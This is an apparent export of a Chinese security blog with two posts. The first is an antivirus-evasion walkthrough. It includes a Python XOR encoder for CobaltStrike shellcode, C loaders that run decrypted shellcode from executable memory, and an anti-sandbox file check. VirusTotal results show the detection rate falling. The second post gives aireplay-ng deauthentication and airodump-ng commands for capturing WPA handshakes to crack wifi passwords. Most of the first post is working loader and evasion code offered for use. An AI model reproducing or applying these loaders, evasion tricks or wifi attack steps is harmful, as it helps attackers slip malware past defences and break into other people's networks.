  <entry>
    <title>免杀笔记</title>
    <url>/2021/10/31/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0-This-is-Y/</url>
    <content><![CDATA[<h1 id="VS2019使用注意事项"><a href="#VS2019使用注意事项" class="headerlink" title="VS2019使用注意事项"></a>VS2019使用注意事项</h1><ol>
<li><p>使用Release<br> 在” 项目 –&gt; 项目属性(最后一个) “里,左上角配置里，改位release</p>
</li>
<li><p>禁用优化<br> 在” 项目 –&gt; 项目属性(最后一个) –&gt; C/C++ –&gt; 优化 “里面</p>
</li>
<li><p>禁用栈缓冲区安全检查(?Gs)<br> 在” 项目 –&gt; 项目属性(最后一个) –&gt; C/C++ –&gt; 代码生成 “里<br> <a class="link" href="https://blog.csdn.net/wenrennaoda/article/details/99683051">https://blog.csdn.net/wenrennaoda/article/details/99683051<i class="fas fa-external-link-alt"></i></a></p>
</li>
<li><p>禁用DEP<br> 在” 项目 –&gt; 项目属性(最后一个) –&gt; 链接器 –&gt; 高级 “里 </p>
</li>
<li><p>在编译时根据生成的shellcode有没有勾选x64，选择64或86，不然编译运行会报错Privileged instruction<br> <img src="image-20211101151927362.png" alt="image-20211101151927362"></p>
</li>
<li><p>重新定义程序入口<br> #pragma comment(linker,”/subsystem:&quot;windows&quot; /entry:&quot;Run&quot;“)  </p>
</li>
<li><p>关闭运行黑窗口<br> #pragma comment(linker, “/INCREMENTAL:NO”)   </p>
</li>
<li><p>文件后缀应该是.cpp，而不是.c</p>
</li>
<li><p><strong>优先选择x86，也就是32位的shellcode，可以少很多麻烦</strong></p>
</li>
</ol>
<h1 id="源码免杀"><a href="#源码免杀" class="headerlink" title="源码免杀"></a>源码免杀</h1><ul>
<li>目的：<ul>
<li>shellcode在执行前，防病毒软件都不能正确识别它</li>
</ul>
</li>
<li>面临的问题：<ul>
<li>需要抵抗静态/启发式检测</li>
</ul>
</li>
<li>解决方法：<ul>
<li>加密存储shellcode，内存解密</li>
<li>混淆解密代码</li>
<li></li>
</ul>
</li>
</ul>
<ol start="3">
<li>常见病毒检测机制:<br>1.静态检测<pre><code>不允许程序的情况下进行软件的分析检测。
</code></pre>
2.动态检测<pre><code>在真实或虚拟处理器上运行程序，HOOK关键函数对传递的参数、文件操作、内存操作进行检测。
</code></pre>
3.基于特征码检测<pre><code>大部分防病毒软件识别恶意软件的基础。获取恶意样本，提取特征码，放入放入防病毒库。(特征码的提取可以使用模糊哈希算法)
</code></pre>
4.基于沙箱的检测<pre><code>在隔离或虚拟的环境中进行测试。对文件操作、内存操作等进行行为分析和规则匹配。(加壳加密程序好检测)
</code></pre>
5.启发式检测<pre><code>通过预定义的标准对代码片段进行分类,提供威胁/风险等级来检测未知病毒，一旦分数高于阈值就识别为恶意软件。
</code></pre>
</li>
</ol>
<ul>
<li>免杀核心思想:混淆、加解密、替换<ul>
<li>加解密: 对shellcode或二 进制程序进行加密使其难以逆向。对环境进行检测，运行环境”安全”则开始解密并在内存中加载执行</li>
<li>混淆: 在不破坏程序运行的基础上，通过添加几行无意义代码或更改指令执行顺序(使静态分析更困难,还改变了二进制程序的散列特征)</li>
</ul>
</li>
</ul>
<ol>
<li>内联汇编混淆解密代码</li>
<li>shellcode免杀（异或）</li>
<li>函数指针执行shellcode，关闭edp（执行数据保护）</li>
</ol>
<p>. </p>
<h1 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h1><ol>
<li>异或<br><a class="link" href="https://saucer-man.com/operation_and_maintenance/465.html">https://saucer-man.com/operation_and_maintenance/465.html<i class="fas fa-external-link-alt"></i></a><br>先借助python,对shellcode编码,<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">shellcode, key</span>):</span></span><br><span class="line">    new_shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="comment"># 对shellcode的每一位进行xor亦或处理</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode)):</span><br><span class="line">        s = <span class="built_in">ord</span>(shellcode[i])</span><br><span class="line">        p = <span class="built_in">ord</span>((key[i % key_len]))</span><br><span class="line">        s = s ^ p  <span class="comment"># 与p异或，p就是key中的字符之一</span></span><br><span class="line">        s = <span class="built_in">chr</span>(s)</span><br><span class="line">        new_shellcode += s</span><br><span class="line">    <span class="keyword">return</span> new_shellcode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_random_code</span>(<span class="params">shellcode, key</span>):</span></span><br><span class="line">    new_shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="comment"># 每个字节后面添加随机一个字节，随机字符来源于key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode)):</span><br><span class="line">        new_shellcode += shellcode[i]</span><br><span class="line">        new_shellcode += key[i % key_len]</span><br><span class="line">    <span class="keyword">return</span> new_shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将shellcode打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span>(<span class="params">shellcode</span>):</span></span><br><span class="line">    raw = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(shellcode)):</span><br><span class="line">        s = <span class="built_in">hex</span>(<span class="built_in">ord</span>(shellcode[i])).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(s) == <span class="number">1</span>:</span><br><span class="line">            s = <span class="string">&quot;0&quot;</span> + s</span><br><span class="line">        raw =raw + <span class="string">&quot;\\x&quot;</span> + s</span><br><span class="line">    <span class="keyword">return</span> raw</span><br><span class="line"></span><br><span class="line"><span class="comment"># c,64,CobaltStrike</span></span><br><span class="line">shellcode = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这是异或和增加随机字符使用的key，为了提高复杂度也可以使用两个key</span></span><br><span class="line">key = <span class="string">&quot;fdaufdiqe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先对shellcode进行异或处理</span></span><br><span class="line">shellcode = xor(shellcode, key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后在shellcode中增加随机字符</span></span><br><span class="line">shellcode = add_random_code(shellcode, key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将shellcode打印出来</span></span><br><span class="line"><span class="built_in">print</span>(str_to_hex(shellcode))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(_stdcall* CODE)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">XOR_Decrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">//原始shellcode长度</span></span><br><span class="line">	<span class="keyword">int</span> shellcode_final_size = <span class="number">0</span>; <span class="comment">//解码之后的shellcode长度</span></span><br><span class="line">	<span class="keyword">char</span> key[] = <span class="string">&quot;fdaufdiqe&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">int</span> key_size = <span class="keyword">sizeof</span>(key) - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>* shellcode_final;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取shellcode大小</span></span><br><span class="line">	shellcode_size = <span class="keyword">sizeof</span>(shellcode);</span><br><span class="line">	<span class="comment">// 根据加密之后shellcode的大小可以推算出解码之后的大小为(shellcode_size + 1) / 2</span></span><br><span class="line">	shellcode_final_size = (shellcode_size + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">	shellcode_final = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)<span class="built_in">malloc</span>(shellcode_final_size);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//首先去除垃圾代码，将结果保存在shellcode_final</span></span><br><span class="line">	j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">			shellcode_final[j] = shellcode[i];</span><br><span class="line">			j += <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//然后进行异或处理，还原shellcode</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; shellcode_final_size; i++) &#123;</span><br><span class="line">		shellcode_final[i] ^= key[i % key_size];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	PVOID p = <span class="literal">NULL</span>;</span><br><span class="line">	p = VirtualAlloc(<span class="literal">NULL</span>, shellcode_final_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memcpy</span>(p, shellcode_final, shellcode_final_size);</span><br><span class="line">	CODE code = (CODE)p;</span><br><span class="line">	code();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	XOR_Decrypt();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="执行shellcode"><a href="#执行shellcode" class="headerlink" title="执行shellcode"></a>执行shellcode</h1><h2 id="不带内联汇编"><a href="#不带内联汇编" class="headerlink" title="不带内联汇编"></a>不带内联汇编</h2><ul>
<li><p>函数指针执行shellcode，关闭edp（执行数据保护）</p>
<ul>
<li>不能运行，报错：执行位置 0x00000049476FF970 时发生访问冲突。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loader1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	    char shellcode[] = &#x27;shellcode&#x27;;</span><br><span class="line">	    <span class="keyword">int</span> (*func)();</span><br><span class="line">	    func = (<span class="keyword">int</span>(*)())(<span class="keyword">void</span>*)shellcode;</span><br><span class="line">      	(<span class="keyword">int</span>)(*func)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>xxxx</p>
<ul>
<li>不能运行，报错：执行位置 0x0000002E0D8FF5C0 时发生访问冲突。</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loader</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line">    ((<span class="keyword">void</span>(*)(<span class="keyword">void</span>)) &amp; shellcode)();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>xxxx<ul>
<li>可以运行</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loader1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line">        LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">        <span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        ((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>xxxx<ul>
<li>可以运行()</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(_stdcall* CODE)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loader</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line">        PVOID p = <span class="literal">NULL</span>;</span><br><span class="line">        p = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(p, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        CODE code = (CODE)p;</span><br><span class="line">        code();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>xxx<ul>
<li>可以运行，但是只能运行一下</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> loader</span><br><span class="line">&#123;</span><br><span class="line">	LPVOID addressPointer = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), <span class="number">0x3000</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="comment">// Copy shellcode</span></span><br><span class="line">    RtlMoveMemory(addressPointer, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="comment">// Create thread pointing to shellcode address</span></span><br><span class="line">    CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)addressPointer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Sleep for a second to wait for the thread</span></span><br><span class="line">    Sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;c</span><br></pre></td></tr></table></figure>



<ul>
<li>xxxx<ul>
<li>可以运行</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> loader</span><br><span class="line">&#123;</span><br><span class="line">	HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="keyword">sizeof</span>(shellcode), <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="keyword">void</span>* exec = HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    ((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><p>xxxx</p>
<ul>
<li>无法运行<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*Func)</span><span class="params">(LPVOID, SIZE_T, DWORD, DWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loader1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HINSTANCE k32 = LoadLibrary(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line">	Func pFunc;</span><br><span class="line">	<span class="keyword">if</span> (k32 != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		pFunc = (Func)GetProcAddress(k32, <span class="string">&quot;VirtuallAlloc&quot;</span>);</span><br><span class="line">		DWORD exec = pFunc(<span class="number">0</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">		<span class="built_in">memcpy</span>((<span class="keyword">void</span>*)exec, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">		((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<ul>
<li>xxxx<ul>
<li>无法运行</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*Func)</span><span class="params">(LPVOID, SIZE_T, DWORD, DWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loader1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HINSTANCE k32;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov esi, fs: [<span class="number">0x30</span>]	<span class="comment">//得到PEB地址</span></span><br><span class="line">		mov esi, [esi + <span class="number">0xc</span>]	<span class="comment">//指向PEB_LDR_DATA结构的首地址</span></span><br><span class="line">		mov esi, [esi + <span class="number">0x1c</span>]	<span class="comment">//一个双向链表的地址</span></span><br><span class="line">		mov esi, [esi]		<span class="comment">//得到第二个条目kernelBase的链表</span></span><br><span class="line">		mov esi, [esi]		<span class="comment">//得到第三个条目kernel32链表</span></span><br><span class="line">		mov esi, [esi + <span class="number">0x8</span>]	<span class="comment">//得到kernel32.dll地址</span></span><br><span class="line">		mov k32, esi</span><br><span class="line">	&#125;</span><br><span class="line">	Func pFunc;</span><br><span class="line">	<span class="keyword">if</span> (k32 != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		pFunc = (Func)GetProcAddress(k32, <span class="string">&quot;VirtuallAlloc&quot;</span>);</span><br><span class="line">		DWORD exec = pFunc(<span class="number">0</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">		<span class="built_in">memcpy</span>((<span class="keyword">void</span>*)exec, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">		((<span class="keyword">void</span>(*)())exec)();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>














<h2 id="带内联汇编"><a href="#带内联汇编" class="headerlink" title="带内联汇编"></a>带内联汇编</h2><ul>
<li>text节运行shellcode<ul>
<li>不能运行</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">asm</span>(<span class="string">&quot;.byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc8,0x8d 0x00\n\t</span></span><br><span class="line"><span class="string">	&quot;</span><span class="string">&quot;ret\n\t&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h1 id="反沙箱技术"><a href="#反沙箱技术" class="headerlink" title="反沙箱技术"></a>反沙箱技术</h1><ul>
<li><p>延时</p>
<p>借助自带API效果不好,可以通过大量计算来延时</p>
</li>
<li><p>文件名</p>
<p>部分沙箱会重命名文件,可以加一个判断</p>
</li>
<li><p>模拟文件操作</p>
<p>  创建一个文件,再打开,如果文件打开失败(沙箱可能会组织程序创建文件),则有可能是沙箱中</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">    CHAR FILE_PATH[] = <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line">    HANDLE file;</span><br><span class="line">    DWORD tmp;</span><br><span class="line">    LPCVOID buff = <span class="string">&quot;1234&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> outputbuff[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    file = CreateFile(TEXT(<span class="string">&quot;E:\\VS_bypassAV\\1.txt&quot;</span>), GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (WriteFile(file, buff, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)buff), &amp;tmp, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(file);</span><br><span class="line">        file = CreateFile(TEXT(<span class="string">&quot;E:\\VS_bypassAV\\1.txt&quot;</span>),</span><br><span class="line">            GENERIC_READ,</span><br><span class="line">            FILE_SHARE_READ,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            OPEN_EXISTING,</span><br><span class="line">            FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">            <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (ReadFile(file, outputbuff, <span class="number">4</span>, &amp;tmp, <span class="literal">NULL</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buff, outputbuff, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 运行shellcode</span></span><br><span class="line">                loader7();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        CloseHandle(file);</span><br><span class="line">    &#125;</span><br><span class="line">    DeleteFile(TEXT(<span class="string">&quot;E:\\VS_bypassAV\\1.txt&quot;</span>));</span><br><span class="line">&#125;	</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>  亲测,没有加这步的程序,</p>
<p>  11/66</p>
<p>  <a class="link" href="https://www.virustotal.com/gui/file/c58e0ea3fe7f3057730f279aa497f0ccd9ed3f0d5f980c03bae8e54abad214c0?nocache=1">https://www.virustotal.com/gui/file/c58e0ea3fe7f3057730f279aa497f0ccd9ed3f0d5f980c03bae8e54abad214c0?nocache=1<i class="fas fa-external-link-alt"></i></a></p>
<p>  <img src="image-20211101203942264.png" alt="image-20211101203942264"></p>
<p>  加上这步后, </p>
<p>  6/67</p>
<p>  <a class="link" href="https://www.virustotal.com/gui/file/d29d3f9a6b62bc22acaad515abec68a128ab13241a71769be3eb43d0c6ff3682?nocache=1">https://www.virustotal.com/gui/file/d29d3f9a6b62bc22acaad515abec68a128ab13241a71769be3eb43d0c6ff3682?nocache=1<i class="fas fa-external-link-alt"></i></a></p>
<p>  <img src="image-20211101203854967.png" alt="image-20211101203854967"></p>
<p>  对比可以知道,文件操作可以解决avira,Cylance,Elastic,ESET-NOD32,FireEye,Ikarus这些杀软.</p>
</li>
</ul>
<h1 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h1><p>看别人公众号，找了一个工具<a class="link" href="http://www.safengine.com/">http://www.safengine.com/<i class="fas fa-external-link-alt"></i></a></p>
<p>把上面6/67的程序加一下壳，12kb变805kb，大小还不是问题</p>
<p><img src="image-20211105093544797-16360761464651.png" alt="image-20211105093544797"></p>
<p>上virustotal查一下，看来是被加黑名单了</p>
<p>31/66</p>
<p><a class="link" href="https://www.virustotal.com/gui/file/9a09cfd35a685236b0bba9b34f05e9cdcbef9b7eb4eb7ff08b634c5cd19d59fb?nocache=1">https://www.virustotal.com/gui/file/9a09cfd35a685236b0bba9b34f05e9cdcbef9b7eb4eb7ff08b634c5cd19d59fb?nocache=1<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="关于内联汇编"><a href="#关于内联汇编" class="headerlink" title="关于内联汇编"></a>关于内联汇编</h1><p><a class="link" href="https://blog.csdn.net/luoyu510183/article/details/109429007">https://blog.csdn.net/luoyu510183/article/details/109429007<i class="fas fa-external-link-alt"></i></a></p>
<p>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> test = <span class="number">6</span>;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov  eax, test <span class="comment">//把test的值写入eax寄存器</span></span><br><span class="line">        dec  eax  <span class="comment">//寄存器数值减一</span></span><br><span class="line">        mov  test, eax <span class="comment">//把eax的值写回test变量中</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test:%d\n&quot;</span>, test); <span class="comment">//test 为0</span></span><br><span class="line">    <span class="keyword">return</span> test;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>32位汇编不需要做任何调整，只需要注意看这里是不是x86就行,基本上编译一下就过了</p>
<p><img src="image-20211102233755512.png" alt="image-20211102233755512"></p>
<p>相比较于32位汇编, <strong>64位</strong>要麻烦一点, 因为VS原生不支持64位汇编,所以这里需要使用clang来帮助编译.</p>
<p>在” 项目 –&gt; 项目属性(最后一个) –&gt;  常规 –&gt; 平台工具集 “选择</p>
<p>如果没有的话，打开vs installer，找到对应的vs版本，修改 –&gt; 单个组件 搜索clang，安装这两个（<del>真大啊</del>）</p>
<p><img src="image-20211102234724107.png" alt="image-20211102234724107"></p>
<p><img src="image-20211103133934070.png" alt="image-20211103133934070"></p>
<p>然后就可以编译运行了</p>
]]></content>
  </entry>
  <entry>
    <title>关于WPA加密的wifi通过握手包跑字典破解</title>
    <url>/2020/04/06/%E5%85%B3%E4%BA%8EWPA%E5%8A%A0%E5%AF%86%E7%9A%84wifi%E9%80%9A%E8%BF%87%E6%8F%A1%E6%89%8B%E5%8C%85%E8%B7%91%E5%AD%97%E5%85%B8%E7%A0%B4%E8%A7%A3-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12639589.html">源地址：https://www.cnblogs.com/This-is-Y/p/12639589.html<i class="fas fa-external-link-alt"></i></a></p>
<p>airodump-ng wlan0mon</p>
<p>扫描，收集信息，记录BSSID，CH，ESSID</p>
<p>然后airodump-ng -c 10（信道） –bssid xx:xx:xx:xx:xx:xx（MAC地址）-w WEP（文件名）wlan0mon</p>
<p>现在就是等新的客户端连接该AP，连接的时候才能抓到握手包。成功抓包后是这个样子（<a class="link" href="https://blog.csdn.net/tangjikede2008/article/details/104710875/">网图，来源<i class="fas fa-external-link-alt"></i></a>）</p>
<img src="1503868-20200405213335616-604793114.png" alt>

<p> </p>
<p> </p>
<p> 如果是自己测试，可以用aireplay-ng –deauth 20（发送的接触认证帧数量） -a xx:xx:xx:xx:xx:xx（AP的MAC地址） wlan0mon来断开已连接客户端与AP的连接，迫使客户端重新发送握手包进行连接。</p>
<p>但是我在kali上死活抓不到包，问了群里的老哥，说kali抓这个包看血统，既然如此那就和我等非酋无关了。所以决定去CDlinux下测试</p>
<p>这里指一下路：<a class="link" href="http://cdlinux.net/cdlinux-2-1-1.html">http://cdlinux.net/cdlinux-2-1-1.html<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<p>补充，在群里大佬的指示下得到一个新的强迫客户端下线的命令：aireplay-ng -0 20 –a &lt;ap mac&gt; -c &lt; mymac &gt; wlan</p>
<p>不过在这里直接使用会出现一个问题，即wlan0mon is on channel 3, but the AP uses channel 11</p>
<p>这是因为频道被切换，在网上查找资料后有说是内核版本原因，也有说是驱动程序问题。</p>
<p>解决方法：先用airodump-ng找到要目标AP所在的信道，然后使用-c参数来固定一个信道扫描</p>
<p> <img src="1503868-20200406130747772-69603794.png" alt></p>
<p> </p>
<p>用这个方法成功过一次，但是没有保存文件，，，，，很气</p>
<p> 最后一通乱搞，我是用这个完成抓包的</p>
<p>airodump-ng wlan0mon -w WEP1 -c 8</p>
<p>另一个终端执行</p>
<p>aireplay-ng -0 20 –a &lt;ap mac&gt; -c &lt; mymac &gt; wlan</p>
<p>如果没有抓到，那就多执行几遍aireplay-ng或者把20换成别的更大的数字试试</p>
<p> </p>
<p>抓到包后，就是比较简单的跑字典了</p>
